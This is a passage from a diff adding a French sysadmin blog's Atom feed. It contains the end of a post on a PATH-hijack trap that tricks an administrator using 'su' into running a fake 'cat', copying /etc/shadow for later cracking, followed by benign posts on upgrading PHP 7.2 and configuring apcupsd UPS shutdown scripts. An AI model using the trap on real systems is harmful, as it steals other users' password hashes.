+&lt;p&gt;Il va donc essayer en restant sur votre session mais ce ne sera pas le vrai programme &lt;code&gt;cat&lt;/code&gt;qui sera lancé mais notre petit script:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$ ls -l /home/vous/mon-super-fichier
+-rw-r--r-- &lt;span class="m"&gt;1&lt;/span&gt; you wheel &lt;span class="m"&gt;41&lt;/span&gt; &lt;span class="m"&gt;2020&lt;/span&gt;-06-28 &lt;span class="m"&gt;13&lt;/span&gt;:00 mon-super-fichier
+$ cat /home/vous/mon-super-fichier
+/bin/cat: Permission denied!
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Il va donc vouloir essayer avec les droits root en utilisant &lt;code&gt;su&lt;/code&gt;. Et c'est à ce moment qu'il va faire une erreur. En effet, comme il utilise &lt;code&gt;su&lt;/code&gt; au lieu de &lt;code&gt;su -&lt;/code&gt;, les variables d'environnement ne sont pas écrasées. Il va donc une nouvelle fois executer notre script au lieu d'executer la vrai commande &lt;code&gt;cat&lt;/code&gt;.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$ su
+Password: ...
+$ cat /home/vous/mon-super-fichier
+du contenu super important dans ce fichier.
+$ &lt;span class="nb"&gt;exit&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Il aura donc l'impression que tout a fonctionné et fermé la session root. Donc, vous pouvez maintenant dire "Merci monsieur l'admin" ^^ En effet, notre piège a fonctionné: &lt;/p&gt;
+&lt;p&gt;Nous avons bien récupéré une copie du fichier &lt;code&gt;/etc/shadow&lt;/code&gt;qui contient une liste de tous les comptes et les mots de passe chiffrés:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$ ls -l /tmp/shadow_copy
+-rw-r--r-- &lt;span class="m"&gt;1&lt;/span&gt; root root &lt;span class="m"&gt;1093&lt;/span&gt; &lt;span class="m"&gt;2020&lt;/span&gt;-06-28 &lt;span class="m"&gt;13&lt;/span&gt;:02 /tmp/shadow_copy
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Il ne vous reste plus qu'a tenter de les déchiffrer... et pour ça, je vous laisse lire cet article de l'excellent &lt;a href="https://korben.info/comment-cracker-un-mot-de-passe-sous-linux.html"&gt;korben&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;Sources: &lt;a href="https://stackoverflow.com"&gt;StackOverflow&lt;/a&gt;&lt;/p&gt;</content><category term="Linux"></category><category term="[securite]"></category></entry><entry><title>Mise à jour vers PHP 7.2 sur Debian 8 Jessie</title><link href="https://Coubiac.github.io/mise-a-jour-vers-php-72-sur-debian-8-jessie.html" rel="alternate"></link><published>2018-07-22T10:07:33+02:00</published><updated>2018-07-22T10:07:33+02:00</updated><author><name>Benoît</name></author><id>tag:coubiac.github.io,2018-07-22:/mise-a-jour-vers-php-72-sur-debian-8-jessie.html</id><summary type="html">&lt;p&gt;Avec l'arrivée de Symfony 4.1, PHP 7.2 est obligatoire. Si votre serveur est encore avec DEBIAN 8 Jessie, voici comment mettre à jour PHP vers la version 7.2:&lt;/p&gt;
+&lt;p&gt;Ondřej Surý fournit des paquets PHP 7.2 pour Debian sur son dépot:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;apt-get install apt-transport-https lsb-release ca-certificates
+wget …&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</summary><content type="html">&lt;p&gt;Avec l'arrivée de Symfony 4.1, PHP 7.2 est obligatoire. Si votre serveur est encore avec DEBIAN 8 Jessie, voici comment mettre à jour PHP vers la version 7.2:&lt;/p&gt;
+&lt;p&gt;Ondřej Surý fournit des paquets PHP 7.2 pour Debian sur son dépot:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;apt-get install apt-transport-https lsb-release ca-certificates
+wget -O /etc/apt/trusted.gpg.d/php.gpg https://packages.sury.org/php/apt.gpg
+&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;deb https://packages.sury.org/php/ &lt;/span&gt;&lt;span class="k"&gt;$(&lt;/span&gt;lsb_release -sc&lt;span class="k"&gt;)&lt;/span&gt;&lt;span class="s2"&gt; main&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; tee /etc/apt/sources.list.d/php.list
+apt-get update
+apt-get install php7.2-cli
+apt-get install php7.2 php7.2-opcache libapache2-mod-php7.2 php7.2-mysql php7.2-curl php7.2-json php7.2-gd  php7.2-intl php7.2-mbstring php7.2-xml php7.2-zip php7.2-fpm php7.2-readline
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Ensuite, redémarrez APACHE:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;service apache2 restart
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Si tout s'est bien passé, la commande &lt;code&gt;php -v&lt;/code&gt; devrait vous retourner:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;PHP &lt;span class="m"&gt;7&lt;/span&gt;.2.7-2+0~20180714182401.1+jessie~1.gbp3fcba8 &lt;span class="o"&gt;(&lt;/span&gt;cli&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;built: Jul &lt;span class="m"&gt;15&lt;/span&gt; &lt;span class="m"&gt;2018&lt;/span&gt; &lt;span class="m"&gt;13&lt;/span&gt;:57:20&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt; NTS &lt;span class="o"&gt;)&lt;/span&gt;
+Copyright &lt;span class="o"&gt;(&lt;/span&gt;c&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="m"&gt;1997&lt;/span&gt;-2018 The PHP Group
+Zend Engine v3.2.0, Copyright &lt;span class="o"&gt;(&lt;/span&gt;c&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="m"&gt;1998&lt;/span&gt;-2018 Zend Technologies
+    with Zend OPcache v7.2.7-2+0~20180714182401.1+jessie~1.gbp3fcba8, Copyright &lt;span class="o"&gt;(&lt;/span&gt;c&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="m"&gt;1999&lt;/span&gt;-2018, by Zend Technologies
+    with Xdebug v2.6.0, Copyright &lt;span class="o"&gt;(&lt;/span&gt;c&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="m"&gt;2002&lt;/span&gt;-2018, by Derick Rethans
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</content><category term="Linux"></category><category term="[Debian"></category><category term="PHP]"></category></entry><entry><title>Gestion de l’alimentation de serveurs ESXi avec unvonduleur APC</title><link href="https://Coubiac.github.io/gestion-de-lalimentation-de-serveurs-esxi-avec-unvonduleur-apc.html" rel="alternate"></link><published>2018-06-25T06:06:54+02:00</published><updated>2018-06-25T06:06:54+02:00</updated><author><name>admin</name></author><id>tag:coubiac.github.io,2018-06-25:/gestion-de-lalimentation-de-serveurs-esxi-avec-unvonduleur-apc.html</id><summary type="html">&lt;p&gt;Nous utilisons ici une machine DEBIAN 8 fraichement installée (un petit CPU et 256Mo de RAM suffisent)&lt;/p&gt;
+&lt;h2&gt;Installation&lt;/h2&gt;
+&lt;h3&gt;Connexion de l’onduleur au serveur en USB&lt;/h3&gt;
+&lt;p&gt;La connexion se fait à l’aide du câble &lt;strong&gt;USB-RJ45&lt;/strong&gt; fourni avec l’onduleur.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Allumez l'UPS.&lt;/li&gt;
+&lt;li&gt;Connectez d'abord le côté RJ45 dans l'UPS (à …&lt;/li&gt;&lt;/ul&gt;</summary><content type="html">&lt;p&gt;Nous utilisons ici une machine DEBIAN 8 fraichement installée (un petit CPU et 256Mo de RAM suffisent)&lt;/p&gt;
+&lt;h2&gt;Installation&lt;/h2&gt;
+&lt;h3&gt;Connexion de l’onduleur au serveur en USB&lt;/h3&gt;
+&lt;p&gt;La connexion se fait à l’aide du câble &lt;strong&gt;USB-RJ45&lt;/strong&gt; fourni avec l’onduleur.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Allumez l'UPS.&lt;/li&gt;
+&lt;li&gt;Connectez d'abord le côté RJ45 dans l'UPS (à l'arrière) dans la fiche notée &lt;code&gt;USB&lt;/code&gt;.&lt;/li&gt;
+&lt;li&gt;Connectez ensuite le côté USB dans un port libre USB de la machine linux&lt;/li&gt;
+&lt;li&gt;Vérifiez la connexion en tapant la commande &lt;code&gt;lsusb&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Vous devriez obtenir la liste des périphériques USB branchés sur la machine linux et notamment une ligne ressemblant à &lt;code&gt;Bus 001 Device 002: ID 051d:0002 American Power Conversion Back-UPS Pro 500/1000/1500&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3&gt;Connexion de l’onduleur au réseau ethernet de l’entreprise en utilisant une carte AP9630&lt;/h3&gt;
+&lt;p&gt;Le paramétrage de la carte n’est pas traité ici. Pour plus d’informations, se référer au manuel de l’utilisateur de la carte: &lt;a href="/images/UPS-Network-Management-Card-2.pdf"&gt;UPS Network Management Card 2&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;Toutefois, pensez à déclarer l’IP de la machine de gestion linux dans l’interface web de la carte sous le menu &lt;code&gt;Configuration -&amp;gt; PowerChute Clients&lt;/code&gt;&lt;/p&gt;
+&lt;h3&gt;Installation des paquets nécessaires&lt;/h3&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;apt-get update &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; apt-get install apcupsd sendemail putty-tools
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h3&gt;Configuration du daemon de gestion de l’onduleur APCUPSD&lt;/h3&gt;
+&lt;p&gt;Le démon place ses fichiers de configuration à deux endroits:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;/etc/apcupsd/
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;root@debian:/etc/apcupsd$ ls -l
+total &lt;span class="m"&gt;60&lt;/span&gt;
+-rwxr-xr-x &lt;span class="m"&gt;1&lt;/span&gt; user user &lt;span class="m"&gt;4488&lt;/span&gt; févr. &lt;span class="m"&gt;15&lt;/span&gt; &lt;span class="m"&gt;12&lt;/span&gt;:14 apccontrol
+-rw-r--r-- &lt;span class="m"&gt;1&lt;/span&gt; root root &lt;span class="m"&gt;12623&lt;/span&gt; févr. &lt;span class="m"&gt;15&lt;/span&gt; &lt;span class="m"&gt;12&lt;/span&gt;:15 apcupsd.conf
+-rwxr-xr-x &lt;span class="m"&gt;1&lt;/span&gt; user user &lt;span class="m"&gt;424&lt;/span&gt; févr. &lt;span class="m"&gt;15&lt;/span&gt; &lt;span class="m"&gt;10&lt;/span&gt;:39 changeme
+-rwxr-xr-x &lt;span class="m"&gt;1&lt;/span&gt; user user &lt;span class="m"&gt;413&lt;/span&gt; févr. &lt;span class="m"&gt;15&lt;/span&gt; &lt;span class="m"&gt;10&lt;/span&gt;:39 commfailure
+-rwxr-xr-x &lt;span class="m"&gt;1&lt;/span&gt; user user &lt;span class="m"&gt;452&lt;/span&gt; févr. &lt;span class="m"&gt;15&lt;/span&gt; &lt;span class="m"&gt;10&lt;/span&gt;:39 commok
+-rw-r--r-- &lt;span class="m"&gt;1&lt;/span&gt; user user &lt;span class="m"&gt;662&lt;/span&gt; févr. &lt;span class="m"&gt;15&lt;/span&gt; &lt;span class="m"&gt;10&lt;/span&gt;:39 hosts.conf
+-rwxr-xr-x &lt;span class="m"&gt;1&lt;/span&gt; user user &lt;span class="m"&gt;617&lt;/span&gt; févr. &lt;span class="m"&gt;15&lt;/span&gt; &lt;span class="m"&gt;10&lt;/span&gt;:39 killpower
+-rw-r--r-- &lt;span class="m"&gt;1&lt;/span&gt; user user &lt;span class="m"&gt;2344&lt;/span&gt; févr. &lt;span class="m"&gt;15&lt;/span&gt; &lt;span class="m"&gt;10&lt;/span&gt;:39 multimon.conf
+-rwxr-xr-x &lt;span class="m"&gt;1&lt;/span&gt; user user &lt;span class="m"&gt;752&lt;/span&gt; févr. &lt;span class="m"&gt;15&lt;/span&gt; &lt;span class="m"&gt;10&lt;/span&gt;:39 offbattery
+-rwxr-xr-x &lt;span class="m"&gt;1&lt;/span&gt; user user &lt;span class="m"&gt;741&lt;/span&gt; févr. &lt;span class="m"&gt;15&lt;/span&gt; &lt;span class="m"&gt;10&lt;/span&gt;:39 onbattery
+-rwxr-xr-x &lt;span class="m"&gt;1&lt;/span&gt; user user &lt;span class="m"&gt;944&lt;/span&gt; févr. &lt;span class="m"&gt;15&lt;/span&gt; &lt;span class="m"&gt;10&lt;/span&gt;:39 ups-monitor
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;ainsi que le fichier&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;/etc/default/apcupsd
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Attention, dans ce fichier la propriété ISCONFIGURED doit être YES car vous n’arriverez pas à démarrer le service.&lt;/p&gt;
+&lt;h3&gt;Configuration du démon pour utilisation de la carte AP9630&lt;/h3&gt;
+&lt;p&gt;Un fichier de configuration ainsi que 3 scripts vont nous intéresser:&lt;/p&gt;
+&lt;p&gt;Fichier de configuration:&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;/etc/apcupsd/apcupsd.conf&lt;/code&gt; -&amp;gt; Configuration générale&lt;/p&gt;
+&lt;p&gt;Trois scripts:&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;/etc/apcupsd/onbattery&lt;/code&gt; -&amp;gt; Envoie d’un mail pour notifier la coupure d’électricité&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;/etc/apcupsd/offbattery&lt;/code&gt; -&amp;gt; Envoie d’un mail pour notifier le rétablissement de l’électricité.&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;/etc/apcupsd/apccontrol&lt;/code&gt; -&amp;gt; Procédure d'extinction&lt;/p&gt;
+&lt;p&gt;Le fichier &lt;code&gt;apcupsd.conf&lt;/code&gt; doit avoir ce genre de configuration:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="c1"&gt;## apcupsd.conf v1.1 ##&lt;/span&gt;
+UPSNAME UPS01 &lt;span class="c1"&gt;#Nom de l&amp;#39;UPS&lt;/span&gt;
+UPSCABLE ether &lt;span class="c1"&gt;#Type de cable&lt;/span&gt;
+UPSTYPE pcnet &lt;span class="c1"&gt;#On utilise le driver PowerChute&lt;/span&gt;
+LOCKFILE /var/lock
+DEVICE ipaddr:user:passphrase &lt;span class="c1"&gt;# Cette propriété peut être laissée vide mais c&amp;#39;est un tout petit peu moins sécurisé&lt;/span&gt;
+UPSCLASS standalone
+UPSMODE disable
+ONBATTERYDELAY &lt;span class="m"&gt;20&lt;/span&gt; &lt;span class="c1"&gt;#Au bout de 20 seconde lance le script &amp;quot;onbattery&amp;quot; qui va notifier par mail&lt;/span&gt;
+
+&lt;span class="c1"&gt;#ATTENTION ! Les trois propriétés suivantes fonctionnent en simultané. La survenue de l&amp;#39;un de ces évènements lance le script apccontrol et donc la procédure d&amp;#39;arret&lt;/span&gt;
+BATTERYLEVEL &lt;span class="m"&gt;20&lt;/span&gt; &lt;span class="c1"&gt;#L&amp;#39;onduleur n&amp;#39;a plus que 20% de battery&lt;/span&gt;
+MINUTES &lt;span class="m"&gt;20&lt;/span&gt; &lt;span class="c1"&gt;#L&amp;#39;onduleur n&amp;#39;a plus que 20 minutes de batterie&lt;/span&gt;
+TIMEOUT &lt;span class="m"&gt;600&lt;/span&gt; &lt;span class="c1"&gt;#L&amp;#39;onduleur est sur batterie depuis 600 secondes. Si on le configure à 0, ce timer est désactivé.&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;strong&gt;Attention !&lt;/strong&gt; dans la propriété DEVICE, user et passphrase ne correspondent pas au nom d’utilisateur utilisé pour se connecter à l’interface web. Ce nom d’utilisateur et cette passphrase se configurent dans l’interface web de la carte sous:&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;Configuration -&amp;gt; Shutdown&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;voici un exemple de script onbattery qui va envoyer un mail de notification (on utilise un smtp ouvert)&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="c1"&gt;# this shell script if placed in /etc/apcupsd&lt;/span&gt;
+&lt;span class="c1"&gt;# will be called by /etc/apcupsd/apccontrol when the UPS&lt;/span&gt;
+&lt;span class="c1"&gt;# goes on batteries.&lt;/span&gt;
+&lt;span class="c1"&gt;#&lt;/span&gt;
+&lt;span class="nv"&gt;SYSADMIN&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;administrateur@exemple.com
+&lt;span class="nv"&gt;APCUPSD_MAIL&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;/usr/bin/sendemail&amp;quot;&lt;/span&gt;
+&lt;span class="nv"&gt;HOSTNAME&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="sb"&gt;`&lt;/span&gt;hostname&lt;span class="sb"&gt;`&lt;/span&gt;
+&lt;span class="nv"&gt;MSG&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;COUPURE ELECTRIQUE DANS SALLE SERVEUR&amp;quot;&lt;/span&gt;
+&lt;span class="c1"&gt;#&lt;/span&gt;
+&lt;span class="o"&gt;(&lt;/span&gt;
+&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot; &amp;quot;&lt;/span&gt;
+&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot; ==================================================&amp;quot;&lt;/span&gt;
+&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot; COUPURE ELECTRIQUE EN COURS DANS LA SALLE SERVEUR&amp;quot;&lt;/span&gt;
+&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot; ==================================================&amp;quot;&lt;/span&gt;
+&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot; &amp;quot;&lt;/span&gt;
+&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot; L&amp;#39;onduleur a detecté un probleme et sa batterie a pris le relais&amp;quot;&lt;/span&gt;
+&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot; &amp;quot;&lt;/span&gt;
+&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Ne paniquez pas ! Restez calme ...&amp;quot;&lt;/span&gt;
+&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot; &amp;quot;&lt;/span&gt;
+&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Status de l&amp;#39;onduleur:&amp;quot;&lt;/span&gt;
+&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot; &amp;quot;&lt;/span&gt;
+/sbin/apcaccess status
+&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="nv"&gt;$APCUPSD_MAIL&lt;/span&gt; -u &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="nv"&gt;$MSG&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt; -f onduleur@exemple.com -t &lt;span class="nv"&gt;$SYSADMIN&lt;/span&gt; -s smtp-relay.exemple.com:25
+&lt;span class="nb"&gt;exit&lt;/span&gt; &lt;span class="m"&gt;0&lt;/span&gt;
+offbattery qui va notifier du retour à la normale
+&lt;span class="c1"&gt;# this shell script if placed in /etc/apcupsd&lt;/span&gt;
+&lt;span class="c1"&gt;# will be called by /etc/apcupsd/apccontrol when the UPS&lt;/span&gt;
+&lt;span class="c1"&gt;# goes on batteries.&lt;/span&gt;
+&lt;span class="c1"&gt;#&lt;/span&gt;
+&lt;span class="nv"&gt;SYSADMIN&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;administrateur@exemple.com
+&lt;span class="nv"&gt;APCUPSD_MAIL&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;/usr/bin/sendemail&amp;quot;&lt;/span&gt;
+&lt;span class="nv"&gt;HOSTNAME&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="sb"&gt;`&lt;/span&gt;hostname&lt;span class="sb"&gt;`&lt;/span&gt;
+&lt;span class="nv"&gt;MSG&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;ALIMENTATION ELECTRIQUE RETABLIE DANS SALLE SERVEUR&amp;quot;&lt;/span&gt;
+&lt;span class="c1"&gt;#&lt;/span&gt;
+&lt;span class="o"&gt;(&lt;/span&gt;
+&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot; &amp;quot;&lt;/span&gt;
+&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot; ==================================================&amp;quot;&lt;/span&gt;
+&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot; ALIMENTATION ELECTRIQUE RETABLIE DANS LA SALLE SERVEUR&amp;quot;&lt;/span&gt;
+&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot; ==================================================&amp;quot;&lt;/span&gt;
+&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot; &amp;quot;&lt;/span&gt;
+&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot; La salle serveur est à nouveau alimentée electriquement&amp;quot;&lt;/span&gt;
+&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot; &amp;quot;&lt;/span&gt;
+&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot; Tout est revenu à la normale... nous sommes sauvés...&amp;quot;&lt;/span&gt;
+&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot; &amp;quot;&lt;/span&gt;
+&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Status de l&amp;#39;onduleur:&amp;quot;&lt;/span&gt;
+&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot; &amp;quot;&lt;/span&gt;
+/sbin/apcaccess status
+&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="nv"&gt;$APCUPSD_MAIL&lt;/span&gt; -u &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="nv"&gt;$MSG&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt; -f onduleur@exemple.com -t &lt;span class="nv"&gt;$SYSADMIN&lt;/span&gt; -s smtp-relay.gmail.com:25
+&lt;span class="nb"&gt;exit&lt;/span&gt; &lt;span class="m"&gt;0&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Ensuite on modifie le fichier apccontrol afin de se logguer en SSH sur les ESXi et lancer une procédure d’extinction. On peut aussi éteindre des serveurs windows physiques. Pensez à bien paramétrer VSPHERE pour bien établir l’ordre d’extinction des VM's&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="ch"&gt;#!/bin/sh&lt;/span&gt;
+&lt;span class="c1"&gt;#&lt;/span&gt;
+&lt;span class="c1"&gt;# Copyright (C) 1999-2002 Riccardo Facchetti &amp;lt;riccardo@master.oasi.gpa.it&amp;gt;&lt;/span&gt;
+&lt;span class="c1"&gt;#&lt;/span&gt;
+&lt;span class="c1"&gt;# for apcupsd release 3.14.12 (29 March 2014) - debian&lt;/span&gt;
+&lt;span class="c1"&gt;#&lt;/span&gt;
+&lt;span class="c1"&gt;# platforms/apccontrol. Generated from apccontrol.in by configure.&lt;/span&gt;
+&lt;span class="c1"&gt;#&lt;/span&gt;
+&lt;span class="c1"&gt;# Note, this is a generic file that can be used by most&lt;/span&gt;
+&lt;span class="c1"&gt;# systems. If a particular system needs to have something&lt;/span&gt;
+&lt;span class="c1"&gt;# special, start with this file, and put a copy in the&lt;/span&gt;
+&lt;span class="c1"&gt;# platform subdirectory.&lt;/span&gt;
+&lt;span class="c1"&gt;#&lt;/span&gt;
+
+&lt;span class="c1"&gt;#&lt;/span&gt;
+&lt;span class="c1"&gt;# These variables are needed for set up the autoconf other variables.&lt;/span&gt;
+&lt;span class="c1"&gt;#&lt;/span&gt;
+&lt;span class="nv"&gt;prefix&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/usr
+&lt;span class="nv"&gt;exec_prefix&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;prefix&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;
+
+&lt;span class="nv"&gt;APCPID&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/var/run/apcupsd.pid
+&lt;span class="nv"&gt;APCUPSD&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/sbin/apcupsd
+&lt;span class="nv"&gt;SHUTDOWN&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/sbin/shutdown
+&lt;span class="nv"&gt;SCRIPTSHELL&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/bin/sh
+&lt;span class="nv"&gt;SCRIPTDIR&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/etc/apcupsd
+&lt;span class="nv"&gt;WALL&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;wall
+
+&lt;span class="nb"&gt;export&lt;/span&gt; &lt;span class="nv"&gt;SYSADMIN&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;root
+&lt;span class="nb"&gt;export&lt;/span&gt; &lt;span class="nv"&gt;APCUPSD_MAIL&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;mail&amp;quot;&lt;/span&gt;
+&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt; -f &lt;span class="nv"&gt;$SCRIPTDIR&lt;/span&gt;/config &lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;then&lt;/span&gt; . &lt;span class="nv"&gt;$SCRIPTDIR&lt;/span&gt;/config &lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;fi&lt;/span&gt;
+
+&lt;span class="c1"&gt;#&lt;/span&gt;
+&lt;span class="c1"&gt;# Concatenate all output from this script to the events file&lt;/span&gt;
+&lt;span class="c1"&gt;# Note, the following kills the script in a power fail situation&lt;/span&gt;
+&lt;span class="c1"&gt;# where the disks are mounted read-only.&lt;/span&gt;
+&lt;span class="c1"&gt;# exec &amp;gt;&amp;gt;/var/log/apcupsd.events 2&amp;gt;&amp;amp;1&lt;/span&gt;
+
+&lt;span class="c1"&gt;#&lt;/span&gt;
+&lt;span class="c1"&gt;# This piece is to substitute the default behaviour with your own script,&lt;/span&gt;
+&lt;span class="c1"&gt;# perl, or C program.&lt;/span&gt;
+&lt;span class="c1"&gt;# You can customize every single command creating an executable file (may be a&lt;/span&gt;
+&lt;span class="c1"&gt;# script or a compiled program) and calling it the same as the $1 parameter&lt;/span&gt;
+&lt;span class="c1"&gt;# passed by apcupsd to this script.&lt;/span&gt;
+&lt;span class="c1"&gt;#&lt;/span&gt;
+&lt;span class="c1"&gt;# After executing your script, apccontrol continues with the default action.&lt;/span&gt;
+&lt;span class="c1"&gt;# If you do not want apccontrol to continue, exit your script with exit&lt;/span&gt;
+&lt;span class="c1"&gt;# code 99. E.g. &amp;quot;exit 99&amp;quot;.&lt;/span&gt;
+&lt;span class="c1"&gt;#&lt;/span&gt;
+&lt;span class="c1"&gt;# WARNING: the apccontrol file will be overwritten every time you update your&lt;/span&gt;
+&lt;span class="c1"&gt;# apcupsd, doing `make install&amp;#39;. Your own customized scripts will _not_ be&lt;/span&gt;
+&lt;span class="c1"&gt;# overwritten. If you wish to make changes to this file (discouraged), you&lt;/span&gt;
